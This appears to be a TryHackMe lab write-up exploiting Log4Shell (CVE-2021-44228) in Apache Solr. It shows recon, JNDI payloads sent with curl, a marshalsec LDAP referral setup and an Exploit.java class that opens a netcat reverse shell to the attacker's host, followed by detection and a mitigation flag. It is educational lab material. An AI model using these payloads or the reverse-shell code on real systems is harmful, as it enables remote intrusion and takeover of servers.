---
layout: default
title : p3rzv41 - TryHackMe Solar Log4Shell Writeup
---

The Log4j vulnerability allows a remote attacker to execute arbitrary code remotely on a target system.

Let hit it;

![image](https://user-images.githubusercontent.com/69868171/149912748-0f0770e6-1bcc-4aec-addd-7b592396222c.png)

### Reconnaissance:-

```
nmap -v 10.10.250.31
nmap -T5 -v -n -p- 10.10.250.31
nmap -sV -p 8983 10.10.250.31
```

![image](https://user-images.githubusercontent.com/69868171/149913029-551c13de-3e78-4ed3-a989-29604d12a772.png)

### Discovery:-

When we navigate to `http://10.10.250.31:8983` we should be able to see clear indicators that log4j is in use within the application for logging activity, this can be seen below;- 

![image](https://user-images.githubusercontent.com/69868171/149913246-d90e78a0-c831-41a9-a87e-668ab449605d.png)

The -Dsolr.log.dir argument set to `/var/solr/logs`

![image](https://user-images.githubusercontent.com/69868171/149913403-826766c7-81f4-4c2d-bcbd-0061dc21d689.png)

Downloaded the log files and we can see a significant number of `INFO` entries showing repeated requests to one specific URL endpoint path repeating the entries: `/admin/cores` and the field indicating data entry point will be the `params={}` .

![image](https://user-images.githubusercontent.com/69868171/149913562-fe632719-734e-436a-b57b-b6fce6e97547.png)

### Proof Of Concept:-

Visiting `http://10.10.250.31:8983/solr/admin/cores` you also noticed that params seem to be included in the log file. At this point, you may already be beginning to see the attack vector.

![image](https://user-images.githubusercontent.com/69868171/149914077-3b05ff88-73f0-4d9e-b3a5-edc06103e4b0.png)

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files.

Some examples of this syntax are:-

```
${sys:os.name}
${sys:user.name}
${log4j:configParentLocation}
${ENV:PATH}
${ENV:HOSTNAME}
${java:version}
```

The format of the usual syntax that takes advantage of this looks like so:-

```
${jndi:ldap://ATTACKERCONTROLLEDHOST}
```

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. For the ldap:// know that the target will in fact make a connection to an external location.

Click here to read more:- [A Journey From JNDI LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) .

Make a request including this primitive JNDI payload syntax as part of the HTTP parameters.

```
curl 'http://10.10.250.31:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.36.199:1337\}'
```

![image](https://user-images.githubusercontent.com/69868171/149915001-7ec66f1c-5897-4a58-ac3c-8b932529c038.png)


```
nc -nlvp 1337
```

Connection received, we get a strange-looking byte.

![image](https://user-images.githubusercontent.com/69868171/149915091-cdb94c88-e548-4762-a1f3-04e4edf322a4.png)


### Exploitation:- 

Installing Java-8 mirror link below feel free to dig in.

[Index of /jdk/](http://mirrors.rootpei.com/jdk/)

Select the `jdk-8u181-linux-x64.tar.gz` package and download. 

![image](https://user-images.githubusercontent.com/69868171/149915622-16ca60be-3cf4-495d-8575-269b2dd5c582.png)

After downloading and extracting, move the downloaded folder in to /usr/lib/jvm then apply the commands below;

```
sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
```

![image](https://user-images.githubusercontent.com/69868171/149915881-9944babf-cb48-456e-97b5-0d3bf1be1abf.png)

![image](https://user-images.githubusercontent.com/69868171/149915932-8f9ab184-b52b-41fd-94aa-d0dacbd74bc2.png)


`java -version` changed successfully.

![image](https://user-images.githubusercontent.com/69868171/149916015-7d4ce7a0-f497-4c72-8d56-de52813a445d.png)


```
git clone https://github.com/mbechler/marshalsec
cd into the dir
=================
build marshal
sudo apt install maven
mvn clean package -DskipTests
=================
starting the ldap server in marshalsec
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer
```

![image](https://user-images.githubusercontent.com/69868171/149916118-24d80cd9-c722-475f-bf81-391fa8d051ee.png)

With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server.

```
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.36.199:8000/#Exploit"
```

![image](https://user-images.githubusercontent.com/69868171/149916239-a4e8f4e9-006f-4131-88b9-61343ea60f1b.png)


Creating an arbitrary code naming it `Exploit.java` .

```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.8.36.199 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![image](https://user-images.githubusercontent.com/69868171/149916526-2d27aa7a-6bae-4139-9da1-6688bcd9e0a2.png)

Compiling the java exploit code, successfully compiling this will create an `Exploit.class` in the present directory

```
javac Exploit.java -source 8 -target 8
```

![image](https://user-images.githubusercontent.com/69868171/149916651-0a17b510-82e9-4be1-8e25-0f17c8b5708e.png)


Then host the file with an HTTP server and also a listener on port 9999 to catch a reverse shell while the ldap referral server waits.

![image](https://user-images.githubusercontent.com/69868171/149916715-3274354a-4d29-43d7-93eb-a25765a675ae.png)

![image](https://user-images.githubusercontent.com/69868171/149916797-9506b597-d31a-4b16-b931-c32ce40d6614.png)


Now we need to trigger the exploit and fire off our JNDI syntax!.

```
curl 'http://10.10.147.16:8983/solr/admin/cores?foo=$\{jndi:ldap://10.8.36.199:1389/Exploit\}'
```

![image](https://user-images.githubusercontent.com/69868171/149916922-4dd8005c-ca94-4293-8598-3c752d0100fd.png)


Ldap.

![image](https://user-images.githubusercontent.com/69868171/149916995-9fa4a6d2-68f3-43c4-9e7e-72a25a92341d.png)


### Results:- 

We got a shell, with this access a threat actor can realistically do whatever they would like with the victim, privilege escalation, exfiltration, install persistence, perform lateral movement or any other post-exploitation.

![image](https://user-images.githubusercontent.com/69868171/149917090-a1dab8bf-4bbb-4d37-aa9e-dc3b65ebe113.png)


### Persistence

![image](https://user-images.githubusercontent.com/69868171/149917146-3f7a2be0-98a4-476f-bc18-9d3751770efe.png)


upgrading the shell to stable.

![image](https://user-images.githubusercontent.com/69868171/149917226-e0a520f4-b97a-4fa5-98d1-49233e62fc0b.png)


Checking user privileges, this user has sudo privileges and can also log into ssh with a new password.

![image](https://user-images.githubusercontent.com/69868171/149917333-36962d5c-ba59-4948-8c5b-68b27159f2a1.png)


SSH.

![image](https://user-images.githubusercontent.com/69868171/149917455-545edb0a-39c1-4fba-8717-004f30ca3f7d.png)

### Detection

We can also view the solr logs.

![image](https://user-images.githubusercontent.com/69868171/149917557-e6b9d4e2-9301-4ec6-9c53-17e7a8202d83.png)

Viewing the affected solr.log.

![image](https://user-images.githubusercontent.com/69868171/149917611-b4d9db2f-bbf9-4876-80d0-141e71477fd2.png)


Our JNDI attack.

![image](https://user-images.githubusercontent.com/69868171/149917673-9fd5201c-a71f-4f71-af8e-e91b8a58e88a.png)

### Mitigation

Sudo bash as root and locate /etc/default/solr.in.sh use nano to edit and include the following lines below at the bottom of the file and save.

```
SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
```

![image](https://user-images.githubusercontent.com/69868171/149917878-fd95585e-2229-4673-85a2-d9222db6fa80.png)

Then restart the service.

```
sudo /etc/init.d/solr restart
```
![image](https://user-images.githubusercontent.com/69868171/149917985-03e89f38-edf4-4ed2-a409-21161ab175a8.png)


To validate that the patch has taken place, start another netcat listener as you had before, and spin up your temporary LDAP referral server and HTTP server.

![image](https://user-images.githubusercontent.com/69868171/149918049-30fc4cd5-14cd-4285-8645-f30625c80b82.png)
